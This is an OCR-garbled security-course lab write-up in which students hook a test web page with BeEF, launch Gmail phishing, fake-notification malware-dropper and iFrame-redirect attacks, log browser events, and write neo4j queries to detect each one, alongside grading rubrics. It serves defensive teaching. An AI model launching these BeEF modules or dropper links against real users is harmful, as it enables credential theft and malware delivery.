<td colspan="3" rowspan="2" width="255">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Local&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Codespaces</td>
<td width="0"></td>
</tr>
<tr>
<td colspan="2" rowspan="3" width="164">fateO Bump version 0.2.4

examples

pychrome

.coveragerc

.gitignore

.travis.yml

LICENSE
</td>
<td colspan="2" rowspan="3" width="154">update docs

Add example of how to imple

Bump version 0.2.4 remove useless code

update exclude lines

add site add no-sandbox

release 0.1.0
</td>
<td width="0"></td>
</tr>
<tr>
<td colspan="3" rowspan="3" width="255">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Clone&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; O

HTTPS SSH GitHub CLI

Use Git or checkout with SVN using the web URL.

Open with GitHub Desktop

Open with Visual Studio

<table width="89">
<tbody>
<tr>
<td width="89">Download ZIP</td>
</tr>
</tbody>
</table>
</td>
<td width="0"></td>
</tr>
<tr>
<td width="0"></td>
</tr>
<tr>
<td colspan="2" rowspan="2" width="164">MANIFEST.in</td>
<td colspan="2" rowspan="2" width="154">release 0.1.0</td>
<td width="0"></td>
</tr>
<tr>
<td colspan="3" width="255"></td>
<td width="0"></td>
</tr>
<tr>
<td width="32"></td>
<td colspan="2" width="164">README.md</td>
<td colspan="2" width="123">update README.md</td>
<td width="201">&nbsp;Code 55% faster with Al pair programming.

Start my free trial Don’t show again
</td>
<td width="54"></td>
<td width="0"></td>
</tr>
<tr>
<td width="32"></td>
<td colspan="2" width="164">mkdocs.yml</td>
<td colspan="2" width="123">update docs</td>
<td width="201"></td>
<td width="54"></td>
<td width="0"></td>
</tr>
<tr>
<td width="32"></td>
<td width="132"></td>
<td width="32"></td>
<td width="122"></td>
<td width="0"></td>
<td width="201"></td>
<td width="54"></td>
<td width="0"></td>
</tr>
</tbody>
</table>
<ul>
<li>To run the auditor:</li>
</ul>
You need a Linux system with GUI support (It is highly recommended to use Ubuntu)

Make sure you have Python3 and Chrome installed.

Install required packages: pip3 install – -upgrade &amp;&amp; pip3 install requirements . txt

Run Chrome with auditor listening on the events: python3 auditor. py Make sure you do not have a running Chrome instance when running the auditor. To save the hassle of repetitively copying and pasting the URL to Bob’s page to the browser GUI during testing for you, we provide a flag – -init-page which automatically opens the URL you specify when the browser starts. The usage is python3 auditor. py – -init-

page s_PAGE

Then the auditor starts logging the events. If you see a series of 3 events: 1) request, 2) response, and 3) script parsed repetitively shows up, it is the heartbeat sent back and forth between the remote hook and the BeEF server.

<ul>
<li>Use Ctrl-C in the command line to both stop the browser and output the logs for you. Note: don’t close the browser from the GUI.</li>
<li>Self-test:</li>
<li>At runtime: You can check if nodes and edges are properly constructed through self . and self . &nbsp;which print the corresponding information for you.</li>
<li>After running: You can check if two new types of log files FileNode . t sv and Frame_down10ad_Fi1e_Edge . tsv that log download behavior are generated.</li>
<li>Submit your completed event_handler . py to Gradescope.</li>
</ul>
<ol start="3">
<li>Generate logs for Bob’s clean (i.e., with no BeEF hook) webpage where no attack/modification is present with your auditor. To do so, stop and start the dockers on the project page (to get a fresh and clean Bob’s webpage).</li>
</ol>
Compress the generated logs to tar . gz file with the name username]_cs6264_1ab . tar . gz and submit it to Gradescope along with the questionnaire. Note: submission in the wrong format will lead to O pts.

<ul>
<li>Hint: you can use the command tar -czvf tar .gz -c [your_log_directory]</li>
<li>You can confirm the content of your compressed file by the following.</li>
</ul>
$ tar -t f username_cs6264_1ab . tar gz

FrameNode . tsv

Frame_compile_Script _Edge . tsv

Frame_request_Resource_Edge . tsv ResourceNode . tsv

Resource_respond_Frame_Edge . tsv

<h3>ScriptNode . tsv</h3>
Having additional logs files is fine (which may be generated by your browser extensions if you have any) as long as the submitted logs contain those from Bob’s page.

Rubric

Question&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Deliverable&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Credits

Q2.1.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Completed event _handler . py&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 15 %

Q2.1.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Logs of Bob’s clean page

Task 2.2: Attack Investigation (30%)

Description

Congratulations! You have completed the key component of this project. Now that you can collect the logs, what’s left is to connect those information pieces in the log together to recover the whole picture of what happened during compromised browsing sessions, and find the evidence of attacks in the constructed causality graph. In this task, you need to execute and record logs for three common types of attacks: phishing, fake notification, and browser redirection from BeEF:

<ol>
<li>Google Phishing: Commands Social Engineering&nbsp;&nbsp;&nbsp;&nbsp; Google Phishing</li>
</ol>
<table width="596">
<tbody>
<tr>
<td width="34">Details</td>
<td width="30">Logs</td>
<td width="58">Commands</td>
<td width="29">Proxy</td>
<td width="39">XssRays</td>
<td colspan="3" width="406">Network</td>
</tr>
<tr>
<td colspan="3" width="122">-Module Tree</td>
<td colspan="3" width="112">Module Results History</td>
<td colspan="2" width="363">Google Phishing</td>
</tr>
<tr>
<td colspan="3" width="122">phis</td>
<td colspan="3" rowspan="2" width="112">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; date&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; label

o 2023-11- command 05 02:33 1

1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2023-11-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; command

05 17:26&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2
</td>
<td rowspan="2" width="56">Description:

XSS hook URI:

Gmail logout interval (ms):

Redirect delay (ms):
</td>
<td rowspan="2" width="307">This plugin uses an image tag to XSRF the logout button of Gmail. Continuously the user is logge another tab). Additionally it will show the Google favicon and a Gmail phishing page (although ty

11

<table width="293">
<tbody>
<tr>
<td width="293">http://cs6264.gtisc.gatech.edu:39069/demos/plain.html</td>
</tr>
<tr>
<td width="293">10000</td>
</tr>
<tr>
<td width="293">1000</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td colspan="3" width="122">Social Engineering (1 ) e Google Phishing</td>
</tr>
<tr>
<td width="34"></td>
<td width="30"></td>
<td width="58"></td>
<td width="29"></td>
<td width="39"></td>
<td width="44"></td>
<td width="56"></td>
<td width="307"></td>
</tr>
</tbody>
</table>
<ul>
<li>In such an attack, the malicious script typically resets the content of the webpage to a phishing page (e.g., Legit-looking Gmail logging page) by setting the innerHTML variable. When users fill out their credentials and hit the login button, a copy of the credentials is sent to attackers during redirection to the official login service.</li>
</ul>
<ol start="2">
<li>Fake Notification: Commands Social Engineering&nbsp; Fake Notification Bar (Chrome)</li>
</ol>
<table width="596">
<tbody>
<tr>
<td width="35">Details</td>
<td width="30">Logs</td>
<td width="58">Commands</td>
<td width="28">Proxy</td>
<td width="40">XssRays</td>
<td width="42">Network</td>
<td width="364"></td>
</tr>
<tr>
<td colspan="3" width="122">Module Tree</td>
<td colspan="3" width="110">Module Results History</td>
<td width="364"></td>
</tr>
<tr>
<td colspan="3" width="122">noti</td>
<td colspan="3" width="110">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; date&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; label</td>
<td rowspan="2" width="364">Description:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Displays a fake notification bar at the top of the screen, similar to those presented in Chrome. If prompted to download the file specified below.

You can mount an exe in BeEF as per extensions/social_engineering/droppers/readme.txt.

Id:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 17

<table width="293">
<tbody>
<tr>
<td width="293">http://cs6264.gtisc.gatech.edu:39069/dropper.exe</td>
</tr>
<tr>
<td width="293">Additional plugins are required to display all the media on this page.</td>
</tr>
</tbody>
</table>
URL:

Notification text:
</td>
</tr>
<tr>
<td colspan="3" width="122">Social Engineering (4)

Fake Notification Bar

Fake Notification Bar (Chron e Fake Notification Bar (Firefo;

Fake Notification Bar (IE)
</td>
<td colspan="3" width="110">o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2023-11-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; command 05 18:09&nbsp; 1

2023-11-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; command

05 18:10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2
</td>
</tr>
</tbody>
</table>
<ul>
<li>In such an attack, the malicious script typically creates a fake notification bar by modifying the elements of the webpage, to trick users into performing sensitive operations. For example, a fake notification says that the browser is out of date and needs to be updated to continue, or a plugin needs to be installed to proceed. In this way, users are lured into installing malware. The default URL given by BeEF may not be work, hence no download event occurs in the browser. You can set the file URL to any valid one such as <u>https://</u>g<u>com/fateO/</u>py<u>chrome/archive/refs/heads/master.zi</u>p, and play with fake notification text to see how things change on the victim’s side.</li>
</ul>
<ol start="3">
<li>Site Redirection: Commands Browser&nbsp; Redirect Browser (I Frame)</li>
</ol>
<table width="595">
<tbody>
<tr>
<td width="36">Details</td>
<td width="30">Logs</td>
<td width="59">Commands</td>
<td width="28">Proxy</td>
<td width="39">XssRays</td>
<td colspan="3" width="404">Network</td>
</tr>
<tr>
<td colspan="3" width="124">Module Tree</td>
<td colspan="3" width="109">Module Results History</td>
<td colspan="2" width="361">Redirect Browser (iFrame)</td>
</tr>
<tr>
<td colspan="3" width="124">redi</td>
<td colspan="3" rowspan="2" width="109">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; date&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; label

The results from executed command modules will be listed here.
</td>
<td rowspan="2" width="58">Description:

New Title:

New Favicon:

Redirect URL:

Timeout:
</td>
<td rowspan="2" width="304">This module creates a 100% x 100% overlaying iframe and keeps the browers hooked to the fr title, page shortcut icon and the time delay are specified in the parameters below.

The content of the URL bar will not be changed in the hooked browser.

258

<table width="294">
<tbody>
<tr>
<td width="294">BeEF – The Browser Exploitation Framework Project</td>
</tr>
<tr>
<td width="294">http://cs6264.gtisc.gatech.edu:39069/ui/media/images/favicon.ico</td>
</tr>
<tr>
<td width="294">http://beefproject.com/</td>
</tr>
<tr>
<td width="294">3500</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td colspan="3" width="124">Browser (3) e Redirect Browser

Redirect Browser (Rickroll)

Redirect Browser (iFrame)

Debug (1)

Test HTTP Redirect

IPEC (1)

Redis
</td>
</tr>
<tr>
<td width="36"></td>
<td width="30"></td>
<td width="59"></td>
<td width="28"></td>
<td width="39"></td>
<td width="42"></td>
<td width="58"></td>
<td width="304"></td>
</tr>
</tbody>
</table>
<ul>
<li>This is a seemingly less harmful attack as it works by merely creating an overlay frame displaying another website on top of the opened frame. However, the flexibility enables the attacks to be more diverse. For example, the new webpage could be any of the following and more:</li>
<li>a phishing page to steal credentials (similar to attack 1)</li>
<li>a fraud page with fraudulent ads or affiliate links to generate revenue for the attacker</li>
<li>a malicious site to initiate actions on behalf of the users who are authenticated (through session cookies), without their knowledge or consent.</li>
<li>a page with inappropriate content for targeted reputation damage o a page that automatically downloads malware upon opening</li>
</ul>
Once you have collected logs containing those attacks, your next step is to construct a causality graph, and then find the evidence of those attacks in the graph through queries.

Note: These three attacks do not have side effects on your browser. To complete this project, we recommend only playing with these 3 attacks. Other attacks could have an impact on your browser.

<h3>Steps</h3>
For each attack:

<ol>
<li>Log collection: After the auditor runs, open Bob’s webpage, execute the attack, and generate the logs.</li>
<li>Causality graph construction: Load the logs into ne04j to construct the causality graph. Please see the Supplementary Document for the detailed guide.</li>
<li>Query construction: Think about what pattern in the graph can identify a potential Google Phishing attack. Construct a ne04j query through cyber</li>
</ol>
(ne04j’s query language) to locate this pattern in the graph. Please see the Supplementary Document for the detailed guide.

<ol>
<li>Google Phishing: A phishing page must load corresponding resources to display the fake content. In this case, is it normal that a Gmail-related resource gets loaded when the user is visiting the product page of a shopping site? See if you can find a Gmail icon requested in the logs.</li>
</ol>
Based on this logo’s URL, construct a query that returns a Frame&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; request Resource subgraph where the resource node’s URL points to the Gmail favicon in the causality graph, as shown. Submit your query to Q2.2.1 in the questionnaire. Note that:

<ol>
<li>The edge should be returned with the two nodes as well, i.e., the subgraph your query returns should contain two nodes and one edge.</li>
<li>Please use Frame, request, and Resource to name your nodes and edge.</li>
</ol>
Node Details

Resource

332

id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; “c55dc3b5b6dcf364ae24 39ab739edb66”

type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; “Other” u rl

Example query response indicating potential Google Phishing attack.

<ol start="2">
<li>Fake Notification: What is the ultimate goal of this attack? Malware spreading! When you look at the logs, how normal do you think is it for a downloading event to happen when the user is visiting the product page of a shopping site? In this context, the downloading event itself should be suspicious enough. The query you construct should return any Frame download subgraphs in the causality graph. Submit your query to Q2.2.2 in the questionnaire.</li>
</ol>
Results Overview

Nodes (2)

Relationship (1) download (1)

Example query response indicating potential malware downloading.

<ol>
<li>Site Redirection: In this attack, the malicious script creates a new frame displaying the new webpage to cover the existing webpage. Think about this — in a benign webpage design, how often do we need to create a frame through scripts? Script — create Frame pattern in the graph should raise an alert, which should be captured by your query. In addition, oftentimes the URL of the redirected new page is the top domain URL (e.g.,</li>
</ol>
www . example . com ) as opposed to (e.g., www . example . com/xxx/xxx/ ). With this observation, you can further restrict your query by adding a condition — the frame nodes’ security_origin is the same as its url Note the detail that the security_origin does not have the in the end. To perform string operations, you can find help from <u>strin</u>g<u> functions</u> and <u>scalar functions</u> in cypher. As shown in the example below, your query should return the

pattern Script — create Frame where frame nodes’ security_origin is the same as its url except the last character. Submit your query to Q2.2.3 in the questionnaire.

Node Details

Frame

252

<table width="437">
<tbody>
<tr>
<td rowspan="2" width="121"></td>
<td width="50"></td>
<td width="17"></td>
<td rowspan="2" width="249">&nbsp;

<table width="235">
<tbody>
<tr>
<td width="94">loader id</td>
<td width="141">“BA4953D5A327679944A

IE914F2915688”
</td>
</tr>
<tr>
<td width="94">security_origin</td>
<td width="141">‘https://beefproject.com”</td>
</tr>
<tr>
<td width="94">mime_type</td>
<td width="141">“text/html”</td>
</tr>
<tr>
<td width="94">id</td>
<td width="141">“2880B044603FDA45A5D

BEF8534396AC7_BA4953

D5A327679944AIE914F2

915688”
</td>
</tr>
<tr>
<td width="94">url</td>
<td width="141">“https://beefproject.com/”</td>
</tr>
<tr>
<td width="94">is_page</td>
<td width="141">false</td>
</tr>
<tr>
<td width="94">frame id</td>
<td width="141">“2880B044603FDA45A5D</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td width="50"></td>
<td width="17"></td>
</tr>
</tbody>
</table>
BEF8534396AC7″

&nbsp;

Example query response indicating potential site redirection.

Note:

<ol>
<li>Please submit each of your queries in ONE line. Queries submitted in multiple lines lead to O pts during auto-grading, make sure to doublecheck your answer.</li>
<li>Please follow the same naming convention for nodes and edges as the write-up (e.g., Script, create, Frame . Be sure that the first letter of the node name is uppercase and the edge name is all lowercase). Failing to follow the naming convention will result in O pts since other keywords will not be accepted by the auto-grader.</li>
<li>Each of your queries should return a subgraph that contains related nodes and edges as shown in the examples. Incomplete subgraphs returned by your queries will result in O pts.</li>
<li>Your queries being able to reproduce the sub-graphs shown in the examples indicates that you most likely have done the task right. However, except for the phishing attack which looks for a specific favicon as attack evidence — instead of looking for a specific resource in the lab tests (e.g., the exact filename, the exact redirected page’s</li>
</ol>
URL), your other two queries must be generalizable, meaning that they should catch attacks in the real world demonstrating the same behavior patterns (e.g., downloading real malware, redirection to URLs other than the example one). Failing to do so will result in O pts if your last two queries are not general.

Rubric

<table width="560">
<tbody>
<tr>
<td colspan="2" width="325">Question&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Deliverable

Q2.2.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Query for Google Phishing

Q2.2.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Query for Fake Notification
</td>
<td width="187">Credits</td>
<td width="49"></td>
</tr>
<tr>
<td colspan="2" width="325">Q2.2.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Query for Redirect Browser</td>
<td rowspan="2" width="187">10 %</td>
<td rowspan="2" width="49"></td>
</tr>
<tr>
<td width="217">Submission

Rubric
</td>
<td width="108"></td>
</tr>
<tr>
<td width="217">Submit as</td>
<td width="108">Question</td>
<td width="187">Deliverable</td>
<td width="49">Credits</td>
</tr>
<tr>
<td width="217">assignment_questionnaire.txt</td>
<td width="108">QI.I</td>
<td width="187">Secret hash</td>
<td width="49">15 %</td>
</tr>
<tr>
<td width="217">assignment_questionnaire.txt</td>
<td width="108">QI.2.1</td>
<td width="187">Client asset directory</td>
<td width="49"></td>
</tr>
<tr>
<td width="217">assignment_questionnaire.txt</td>
<td width="108">QI.2.2</td>
<td width="187">Best template file to compromise</td>
<td width="49"></td>
</tr>
<tr>
<td width="217">assignment_questionnaire.txt</td>
<td width="108">QI.2.3</td>
<td width="187">Hash on the phishing page</td>
<td width="49"></td>
</tr>
<tr>
<td width="217">event_handler.py</td>
<td width="108">Q2.1.1</td>
<td width="187">Completed event_handler . py</td>
<td width="49">15 %</td>
</tr>
<tr>
<td width="217">tar.gz</td>
<td width="108">Q2.1.2</td>
<td width="187">Logs of Bob’s clean page</td>
<td width="49"></td>
</tr>
<tr>
<td width="217">assignment_questionnaire.txt</td>
<td width="108">Q2.2.1</td>
<td width="187">Query for Google Phishing</td>
<td width="49"></td>
</tr>
<tr>
<td width="217">assignment_questionnaire.txt</td>
<td width="108">Q2.2.2</td>
<td width="187">Query for Fake Notification</td>
<td width="49"></td>
</tr>
<tr>
<td width="217">assignment_questionnaire.txt</td>
<td width="108">Q2.2.3</td>
<td width="187">Query for Redirect Browser</td>
<td width="49"></td>
</tr>
</tbody>
</table>
Deliverables

<ol>
<li>assignment_questionnaire . txt</li>
<li>event_handler . py</li>
<li>[GT tar .gz containing . tsv logs of Bob’s clean page.</li>
</ol>
Important Note:

<ol>
<li>Make sure you use the provided questionnaire and the specified formats to submit your answers. Failing to do so can make your ENTIRE project O pts since auto-grader cannot take in submissions in other formats.</li>
<li>The GTID you fill in the questionnaire must be all lowercase. Failing to do so will make your hash-related tasks O pts since the grading depends on your GTID.</li>
<li>All deliverables should only be submitted to Gradescope. Submissions to Canvas will NOT be accepted and graded.</li>
<li>Make sure you have followed all the guidelines stated in the write-up as well as the supplementary document. Any point deductions caused by failing to follow the guidelines will NOT be adjusted.</li>
</ol>
